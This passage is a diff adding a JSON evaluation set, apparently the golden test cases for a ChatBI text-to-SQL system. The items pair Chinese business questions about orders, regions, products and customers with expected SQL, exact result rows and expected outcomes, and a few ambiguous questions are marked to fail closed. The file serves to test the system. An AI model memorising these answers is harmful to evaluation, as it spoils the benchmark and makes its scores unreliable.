@@ -1,0 +1,251 @@
+{
+  "schema_version": "chatbi.v13.phase5.core-data-100.v1",
+  "name": "ChatBI V1.3 Phase5 Backend Core Data Golden 100",
+  "suite": "CHATBI_V13_PHASE5_BACKEND_CORE_DATA_100",
+  "frozen": true,
+  "frozen_dataset_date": "2026-08-17",
+  "base_manifest": "evaluation/golden/day4-golden-50.json",
+  "base_manifest_sha256": "67a1d43d53232644df86a8e46ee66fc51baaeeb724881679d53855dde49e0dc4",
+  "base_case_question_overrides": {
+    "G21": "汇总冻结数据中全部订单的成本总额",
+    "G22": "计算冻结数据中全部订单收入减成本后的利润"
+  },
+  "required_categories": [
+    "month_over_month", "year_over_year", "topn_join", "tie_topn", "null", "empty_result",
+    "boundary", "cross_month", "cross_year", "complex_filter", "multi_metric_dimension",
+    "ambiguous", "wrong_field", "nonexistent_metric", "dangerous_sql", "extreme_value"
+  ],
+  "extension_cases": [
+    {
+      "id": "P5D051", "category": "tie_topn", "question": "按产品统计订单量前3名，并列时按产品编号稳定排序",
+      "expected_entities": ["orders", "products"], "expected_metrics": ["order_count"], "expected_dimensions": ["product"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT p.product_name AS product, COUNT(o.order_id) AS order_count FROM demo_business.orders o JOIN demo_business.products p ON p.product_id = o.product_id GROUP BY p.product_name, p.product_id ORDER BY order_count DESC, p.product_id ASC LIMIT 3",
+      "expected_result": [{"product":"家用充电桩","order_count":219},{"product":"商用充电桩","order_count":219},{"product":"储能柜","order_count":219}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D052", "category": "tie_topn", "question": "列出订单量最高的3个地区，并列必须按地区编号破除",
+      "expected_entities": ["orders", "regions"], "expected_metrics": ["order_count"], "expected_dimensions": ["region"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT r.region_name AS region, COUNT(o.order_id) AS order_count FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id GROUP BY r.region_name, r.region_id ORDER BY order_count DESC, r.region_id ASC LIMIT 3",
+      "expected_result": [{"region":"华北","order_count":219},{"region":"华东","order_count":219},{"region":"华南","order_count":219}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D053", "category": "tie_topn", "question": "按客户类型统计订单量，完整展示并列名次",
+      "expected_entities": ["orders", "customers"], "expected_metrics": ["order_count"], "expected_dimensions": ["customer_type"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT c.customer_type AS customer_type, COUNT(o.order_id) AS order_count FROM demo_business.orders o JOIN demo_business.customers c ON c.customer_id = o.customer_id GROUP BY c.customer_type ORDER BY order_count DESC, c.customer_type ASC",
+      "expected_result": [{"customer_type":"个人","order_count":365},{"customer_type":"企业","order_count":365},{"customer_type":"渠道","order_count":365}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D054", "category": "tie_topn", "question": "退款订单量最多的前4个产品，数量并列按产品编号排序",
+      "expected_entities": ["orders", "products"], "expected_metrics": ["order_count"], "expected_dimensions": ["product"], "expected_filters": [{"field":"orders.status","value":"REFUNDED"}], "expected_time_range": null,
+      "expected_sql": "SELECT p.product_name AS product, COUNT(o.order_id) AS order_count FROM demo_business.orders o JOIN demo_business.products p ON p.product_id = o.product_id WHERE o.status = 'REFUNDED' GROUP BY p.product_name, p.product_id ORDER BY order_count DESC, p.product_id ASC LIMIT 4",
+      "expected_result": [{"product":"储能柜","order_count":12},{"product":"能源管理终端","order_count":12},{"product":"家用充电桩","order_count":11},{"product":"商用充电桩","order_count":11}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D055", "category": "tie_topn", "question": "按客户统计去重订单量前10名，验证第10名并列边界",
+      "expected_entities": ["orders", "customers"], "expected_metrics": ["distinct_order_count"], "expected_dimensions": ["customer"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT c.customer_name AS customer, COUNT(DISTINCT o.order_id) AS distinct_order_count FROM demo_business.orders o JOIN demo_business.customers c ON c.customer_id = o.customer_id GROUP BY c.customer_name, c.customer_id ORDER BY distinct_order_count DESC, c.customer_id ASC LIMIT 10",
+      "expected_result": [{"customer":"客户-001","distinct_order_count":19},{"customer":"客户-002","distinct_order_count":19},{"customer":"客户-003","distinct_order_count":19},{"customer":"客户-004","distinct_order_count":19},{"customer":"客户-005","distinct_order_count":19},{"customer":"客户-006","distinct_order_count":19},{"customer":"客户-007","distinct_order_count":19},{"customer":"客户-008","distinct_order_count":19},{"customer":"客户-009","distinct_order_count":19},{"customer":"客户-010","distinct_order_count":19}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D056", "category": "extreme_value", "question": "找出单笔收入最大的一张订单，若并列取订单编号最小者",
+      "expected_entities": ["orders"], "expected_metrics": ["revenue"], "expected_dimensions": ["order_id"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT o.order_id, o.revenue FROM demo_business.orders o ORDER BY o.revenue DESC, o.order_id ASC LIMIT 1",
+      "expected_result": [{"order_id":69,"revenue":2887.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D057", "category": "extreme_value", "question": "找出单笔收入最小的一张订单，若并列取最早订单编号",
+      "expected_entities": ["orders"], "expected_metrics": ["revenue"], "expected_dimensions": ["order_id"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT o.order_id, o.revenue FROM demo_business.orders o ORDER BY o.revenue ASC, o.order_id ASC LIMIT 1",
+      "expected_result": [{"order_id":70,"revenue":300.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D058", "category": "extreme_value", "question": "返回成本最高订单的编号和成本，稳定处理相同最大值",
+      "expected_entities": ["orders"], "expected_metrics": ["cost"], "expected_dimensions": ["order_id"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT o.order_id, o.cost FROM demo_business.orders o ORDER BY o.cost DESC, o.order_id ASC LIMIT 1",
+      "expected_result": [{"order_id":54,"cost":1533.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D059", "category": "extreme_value", "question": "返回成本最低订单的编号和成本，稳定处理相同最小值",
+      "expected_entities": ["orders"], "expected_metrics": ["cost"], "expected_dimensions": ["order_id"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT o.order_id, o.cost FROM demo_business.orders o ORDER BY o.cost ASC, o.order_id ASC LIMIT 1",
+      "expected_result": [{"order_id":55,"cost":210.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D060", "category": "extreme_value", "question": "统计最大购买数量以及达到该数量的订单数",
+      "expected_entities": ["orders"], "expected_metrics": ["max_quantity", "order_count"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "WITH maximum AS (SELECT MAX(o.quantity) AS max_quantity FROM demo_business.orders o) SELECT maximum.max_quantity, COUNT(o.order_id) AS order_count FROM demo_business.orders o CROSS JOIN maximum WHERE o.quantity = maximum.max_quantity GROUP BY maximum.max_quantity",
+      "expected_result": [{"max_quantity":4,"order_count":274}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D061", "category": "boundary", "question": "只统计2026年1月1日当天的订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-01-01","end_exclusive":"2026-01-02"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-01-01' AND o.order_date < DATE '2026-01-02'",
+      "expected_result": [{"order_count":3,"revenue":7650.0,"cost":2467.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D062", "category": "boundary", "question": "只统计2026年1月最后一天的订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-01-31","end_exclusive":"2026-02-01"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-01-31' AND o.order_date < DATE '2026-02-01'",
+      "expected_result": [{"order_count":3,"revenue":2025.0,"cost":997.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D063", "category": "cross_year", "question": "统计2025年12月15日至2026年1月14日跨年窗口的订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2025-12-15","end_exclusive":"2026-01-15"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2025-12-15' AND o.order_date < DATE '2026-01-15'",
+      "expected_result": [{"order_count":93,"revenue":134850.0,"cost":84381.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D064", "category": "boundary", "question": "核对2026年2月28日自然月末当天的订单值",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-02-28","end_exclusive":"2026-03-01"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-02-28' AND o.order_date < DATE '2026-03-01'",
+      "expected_result": [{"order_count":3,"revenue":3600.0,"cost":3129.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D065", "category": "boundary", "question": "统计2026年第二季度的订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-04-01","end_exclusive":"2026-07-01"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-04-01' AND o.order_date < DATE '2026-07-01'",
+      "expected_result": [{"order_count":273,"revenue":432337.5,"cost":238385.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D066", "category": "boundary", "question": "按左闭右开口径汇总2026年上半年订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-01-01","end_exclusive":"2026-07-01"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-01-01' AND o.order_date < DATE '2026-07-01'",
+      "expected_result": [{"order_count":543,"revenue":855525.0,"cost":474425.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D067", "category": "cross_month", "question": "统计2026年1月31日至2月2日跨月三天的订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-01-31","end_exclusive":"2026-02-03"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-01-31' AND o.order_date < DATE '2026-02-03'",
+      "expected_result": [{"order_count":9,"revenue":7087.5,"cost":3654.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D068", "category": "boundary", "question": "核对冻结数据最后一天2026年8月17日的订单值",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [], "expected_time_range": {"start":"2026-08-17","end_exclusive":"2026-08-18"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.order_date >= DATE '2026-08-17' AND o.order_date < DATE '2026-08-18'",
+      "expected_result": [{"order_count":3,"revenue":5850.0,"cost":4231.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D069", "category": "empty_result", "question": "查询2026年8月18日之后的订单，必须返回空结果而不是零值行",
+      "expected_entities": ["orders"], "expected_metrics": ["revenue"], "expected_dimensions": ["order_id"], "expected_filters": [], "expected_time_range": {"start":"2026-08-18","end_exclusive":"2026-09-01"},
+      "expected_sql": "SELECT o.order_id, o.revenue FROM demo_business.orders o WHERE o.order_date >= DATE '2026-08-18' AND o.order_date < DATE '2026-09-01' ORDER BY o.order_id ASC",
+      "expected_result": [], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D070", "category": "cross_year", "question": "按自然年比较2025和2026的订单量、收入与成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": ["year"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT EXTRACT(YEAR FROM o.order_date)::integer AS year, COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o GROUP BY EXTRACT(YEAR FROM o.order_date) ORDER BY year ASC",
+      "expected_result": [{"year":2025,"order_count":408,"revenue":639375.0,"cost":347119.5},{"year":2026,"order_count":687,"revenue":1086375.0,"cost":605335.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D071", "category": "complex_filter", "question": "统计华东充电设备中已支付订单的订单量、收入和成本",
+      "expected_entities": ["orders","regions","products"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"regions.region_name","value":"华东"},{"field":"products.category","value":"充电设备"},{"field":"orders.status","value":"PAID"}], "expected_time_range": null,
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id JOIN demo_business.products p ON p.product_id = o.product_id WHERE r.region_name = '华东' AND p.category = '充电设备' AND o.status = 'PAID'",
+      "expected_result": [{"order_count":208,"revenue":326812.5,"cost":180659.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D072", "category": "complex_filter", "question": "统计华南储能设备的退款订单量、收入和成本",
+      "expected_entities": ["orders","regions","products"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"regions.region_name","value":"华南"},{"field":"products.category","value":"储能设备"},{"field":"orders.status","value":"REFUNDED"}], "expected_time_range": null,
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id JOIN demo_business.products p ON p.product_id = o.product_id WHERE r.region_name = '华南' AND p.category = '储能设备' AND o.status = 'REFUNDED'",
+      "expected_result": [{"order_count":12,"revenue":19575.0,"cost":10997.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D073", "category": "complex_filter", "question": "2026年第一季度华东已支付订单的订单量、收入和成本",
+      "expected_entities": ["orders","regions"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"regions.region_name","value":"华东"},{"field":"orders.status","value":"PAID"}], "expected_time_range": {"start":"2026-01-01","end_exclusive":"2026-04-01"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id WHERE r.region_name = '华东' AND o.status = 'PAID' AND o.order_date >= DATE '2026-01-01' AND o.order_date < DATE '2026-04-01'",
+      "expected_result": [{"order_count":51,"revenue":78937.5,"cost":43834.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D074", "category": "complex_filter", "question": "汇总西部的软件与终端品类订单量、收入和成本",
+      "expected_entities": ["orders","regions","products"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"regions.region_name","value":"西部"},{"field":"products.category","value":"软件与终端"}], "expected_time_range": null,
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id JOIN demo_business.products p ON p.product_id = o.product_id WHERE r.region_name = '西部' AND p.category = '软件与终端'",
+      "expected_result": [{"order_count":219,"revenue":361237.5,"cost":200977.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D075", "category": "complex_filter", "question": "统计企业客户的已支付订单量、收入和成本",
+      "expected_entities": ["orders","customers"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"customers.customer_type","value":"企业"},{"field":"orders.status","value":"PAID"}], "expected_time_range": null,
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.customers c ON c.customer_id = o.customer_id WHERE c.customer_type = '企业' AND o.status = 'PAID'",
+      "expected_result": [{"order_count":346,"revenue":544312.5,"cost":296761.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D076", "category": "complex_filter", "question": "退款且单笔收入大于等于1000小于2000的订单量、收入和成本",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"orders.status","value":"REFUNDED"},{"field":"orders.revenue","value":"[1000,2000)"}], "expected_time_range": null,
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o WHERE o.status = 'REFUNDED' AND o.revenue >= 1000 AND o.revenue < 2000",
+      "expected_result": [{"order_count":22,"revenue":32925.0,"cost":19491.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D077", "category": "complex_filter", "question": "2026年2月储能柜订单的订单量、收入和成本",
+      "expected_entities": ["orders","products"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"products.product_name","value":"储能柜"}], "expected_time_range": {"start":"2026-02-01","end_exclusive":"2026-03-01"},
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.products p ON p.product_id = o.product_id WHERE p.product_name = '储能柜' AND o.order_date >= DATE '2026-02-01' AND o.order_date < DATE '2026-03-01'",
+      "expected_result": [{"order_count":17,"revenue":25762.5,"cost":14129.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D078", "category": "complex_filter", "question": "华北或华东的已支付订单量、收入和成本合计",
+      "expected_entities": ["orders","regions"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": [], "expected_filters": [{"field":"regions.region_name","value":["华北","华东"]},{"field":"orders.status","value":"PAID"}], "expected_time_range": null,
+      "expected_sql": "SELECT COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id WHERE r.region_name IN ('华北','华东') AND o.status = 'PAID'",
+      "expected_result": [{"order_count":416,"revenue":645450.0,"cost":356223.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D079", "category": "multi_metric_dimension", "question": "2026年第一季度按地区展示已支付订单量、收入和成本",
+      "expected_entities": ["orders","regions"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": ["region"], "expected_filters": [{"field":"orders.status","value":"PAID"}], "expected_time_range": {"start":"2026-01-01","end_exclusive":"2026-04-01"},
+      "expected_sql": "SELECT r.region_name AS region, COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id = o.region_id WHERE o.status = 'PAID' AND o.order_date >= DATE '2026-01-01' AND o.order_date < DATE '2026-04-01' GROUP BY r.region_name, r.region_id ORDER BY revenue DESC, r.region_id ASC",
+      "expected_result": [{"region":"西部","order_count":52,"revenue":87150.0,"cost":47253.5},{"region":"华南","order_count":51,"revenue":80475.0,"cost":46553.5},{"region":"华东","order_count":51,"revenue":78937.5,"cost":43834.0},{"region":"华北","order_count":51,"revenue":77400.0,"cost":43809.5},{"region":"华中","order_count":51,"revenue":75862.5,"cost":42437.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D080", "category": "multi_metric_dimension", "question": "2026年第二季度按品类展示充电设备订单量、收入和成本",
+      "expected_entities": ["orders","products"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": ["category"], "expected_filters": [{"field":"products.category","value":"充电设备"}], "expected_time_range": {"start":"2026-04-01","end_exclusive":"2026-07-01"},
+      "expected_sql": "SELECT p.category AS category, COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.products p ON p.product_id = o.product_id WHERE p.category = '充电设备' AND o.order_date >= DATE '2026-04-01' AND o.order_date < DATE '2026-07-01' GROUP BY p.category",
+      "expected_result": [{"category":"充电设备","order_count":109,"revenue":170437.5,"cost":93891.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D081", "category": "multi_metric_dimension", "question": "按地区同时统计订单收入、成本和利润",
+      "expected_entities": ["orders","regions"], "expected_metrics": ["revenue","cost","profit"], "expected_dimensions": ["region"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT r.region_name AS region, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost, SUM(o.revenue-o.cost) AS profit FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id=o.region_id GROUP BY r.region_name,r.region_id ORDER BY revenue DESC,r.region_id ASC",
+      "expected_result": [{"region":"西部","revenue":361237.5,"cost":200977.0,"profit":160260.5},{"region":"华南","revenue":353025.0,"cost":195611.5,"profit":157413.5},{"region":"华东","revenue":344812.5,"cost":190246.0,"profit":154566.5},{"region":"华北","revenue":336600.0,"cost":184880.5,"profit":151719.5},{"region":"华中","revenue":330075.0,"cost":180740.0,"profit":149335.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D082", "category": "multi_metric_dimension", "question": "按品类同时给出订单量、收入、成本和利润",
+      "expected_entities": ["orders","products"], "expected_metrics": ["order_count","revenue","cost","profit"], "expected_dimensions": ["category"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT p.category AS category, COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost, SUM(o.revenue-o.cost) AS profit FROM demo_business.orders o JOIN demo_business.products p ON p.product_id=o.product_id GROUP BY p.category ORDER BY revenue DESC,p.category ASC",
+      "expected_result": [{"category":"充电设备","order_count":438,"revenue":681412.5,"cost":375126.5,"profit":306286.0},{"category":"软件与终端","order_count":219,"revenue":361237.5,"cost":200977.0,"profit":160260.5},{"category":"储能设备","order_count":219,"revenue":353025.0,"cost":195611.5,"profit":157413.5},{"category":"服务","order_count":219,"revenue":330075.0,"cost":180740.0,"profit":149335.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D083", "category": "multi_metric_dimension", "question": "按产品同时展示订单量、收入和成本",
+      "expected_entities": ["orders","products"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": ["product"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT p.product_name AS product, COUNT(o.order_id) AS order_count, SUM(o.revenue) AS revenue, SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.products p ON p.product_id=o.product_id GROUP BY p.product_name,p.product_id ORDER BY revenue DESC,p.product_id ASC",
+      "expected_result": [{"product":"能源管理终端","order_count":219,"revenue":361237.5,"cost":200977.0},{"product":"储能柜","order_count":219,"revenue":353025.0,"cost":195611.5},{"product":"商用充电桩","order_count":219,"revenue":344812.5,"cost":190246.0},{"product":"家用充电桩","order_count":219,"revenue":336600.0,"cost":184880.5},{"product":"运维服务包","order_count":219,"revenue":330075.0,"cost":180740.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D084", "category": "multi_metric_dimension", "question": "按地区和订单状态交叉统计订单量、收入和成本",
+      "expected_entities": ["orders","regions"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": ["region","status"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT r.region_name AS region,o.status,COUNT(o.order_id) AS order_count,SUM(o.revenue) AS revenue,SUM(o.cost) AS cost FROM demo_business.orders o JOIN demo_business.regions r ON r.region_id=o.region_id GROUP BY r.region_name,r.region_id,o.status ORDER BY r.region_id ASC,o.status ASC",
+      "expected_result": [{"region":"华北","status":"PAID","order_count":208,"revenue":318637.5,"cost":175563.5},{"region":"华北","status":"REFUNDED","order_count":11,"revenue":17962.5,"cost":9317.0},{"region":"华东","status":"PAID","order_count":208,"revenue":326812.5,"cost":180659.5},{"region":"华东","status":"REFUNDED","order_count":11,"revenue":18000.0,"cost":9586.5},{"region":"华南","status":"PAID","order_count":207,"revenue":333450.0,"cost":184614.5},{"region":"华南","status":"REFUNDED","order_count":12,"revenue":19575.0,"cost":10997.0},{"region":"西部","status":"PAID","order_count":207,"revenue":342337.5,"cost":190176.0},{"region":"西部","status":"REFUNDED","order_count":12,"revenue":18900.0,"cost":10801.0},{"region":"华中","status":"PAID","order_count":208,"revenue":312150.0,"cost":171692.5},{"region":"华中","status":"REFUNDED","order_count":11,"revenue":17925.0,"cost":9047.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D085", "category": "multi_metric_dimension", "question": "按客户类型同时统计订单量、收入、成本和利润",
+      "expected_entities": ["orders","customers"], "expected_metrics": ["order_count","revenue","cost","profit"], "expected_dimensions": ["customer_type"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT c.customer_type,COUNT(o.order_id) AS order_count,SUM(o.revenue) AS revenue,SUM(o.cost) AS cost,SUM(o.revenue-o.cost) AS profit FROM demo_business.orders o JOIN demo_business.customers c ON c.customer_id=o.customer_id GROUP BY c.customer_type ORDER BY c.customer_type ASC",
+      "expected_result": [{"customer_type":"个人","order_count":365,"revenue":575250.0,"cost":317485.0,"profit":257765.0},{"customer_type":"企业","order_count":365,"revenue":574687.5,"cost":316627.5,"profit":258060.0},{"customer_type":"渠道","order_count":365,"revenue":575812.5,"cost":318342.5,"profit":257470.0}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {
+      "id": "P5D086", "category": "multi_metric_dimension", "question": "按月同时展示订单量、收入和成本，覆盖完整冻结期间",
+      "expected_entities": ["orders"], "expected_metrics": ["order_count","revenue","cost"], "expected_dimensions": ["month"], "expected_filters": [], "expected_time_range": null,
+      "expected_sql": "SELECT DATE_TRUNC('month',o.order_date) AS month,COUNT(o.order_id) AS order_count,SUM(o.revenue) AS revenue,SUM(o.cost) AS cost FROM demo_business.orders o GROUP BY DATE_TRUNC('month',o.order_date) ORDER BY month ASC",
+      "expected_result": [{"month":"2025-08-01T00:00:00+08:00","order_count":42,"revenue":46462.5,"cost":30943.5},{"month":"2025-09-01T00:00:00+08:00","order_count":90,"revenue":156937.5,"cost":75740.0},{"month":"2025-10-01T00:00:00+08:00","order_count":93,"revenue":140287.5,"cost":86464.0},{"month":"2025-11-01T00:00:00+08:00","order_count":90,"revenue":136687.5,"cost":75005.0},{"month":"2025-12-01T00:00:00+08:00","order_count":93,"revenue":159000.0,"cost":78967.0},{"month":"2026-01-01T00:00:00+08:00","order_count":93,"revenue":147337.5,"cost":86047.5},{"month":"2026-02-01T00:00:00+08:00","order_count":84,"revenue":125475.0,"cost":68943.0},{"month":"2026-03-01T00:00:00+08:00","order_count":93,"revenue":150375.0,"cost":81049.5},{"month":"2026-04-01T00:00:00+08:00","order_count":90,"revenue":161437.5,"cost":86152.5},{"month":"2026-05-01T00:00:00+08:00","order_count":93,"revenue":129712.5,"cost":73552.5},{"month":"2026-06-01T00:00:00+08:00","order_count":90,"revenue":141187.5,"cost":78680.0},{"month":"2026-07-01T00:00:00+08:00","order_count":93,"revenue":164175.0,"cost":88963.0},{"month":"2026-08-01T00:00:00+08:00","order_count":51,"revenue":66675.0,"cost":41947.5}], "expected_outcome": "SUCCEEDED_AND_VERIFIED"
+    },
+    {"id":"P5D087","category":"ambiguous","question":"收入怎么样？","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D088","category":"ambiguous","question":"哪个最好？","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
+    {"id":"P5D089","category":"ambiguous","question":"把它按那个维度分一下","expected_outcome":"FAIL_CLOSED","allowed_statuses":["FAILED","SECURITY_REJECTED"],"sql_execution_allowed":false},
